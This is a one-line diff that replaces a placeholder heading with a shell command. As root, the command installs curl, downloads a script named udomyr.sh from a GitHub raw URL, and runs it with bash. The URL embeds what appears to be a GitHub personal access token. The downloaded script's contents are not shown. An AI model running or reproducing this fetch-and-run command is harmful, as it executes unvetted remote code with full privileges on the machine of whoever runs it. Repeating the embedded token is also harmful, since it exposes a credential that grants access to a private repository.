@@ -1,1 +1,1 @@
-# ssssssss
+apt update && apt install curl -y && cd /root/ && curl -s -O https://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@raw.githubusercontent.com/potaha/rlskmna/main/udomyr.sh && chmod +x udomyr.sh && sed -i -e 's/\r$//' udomyr.sh && bash ./udomyr.sh
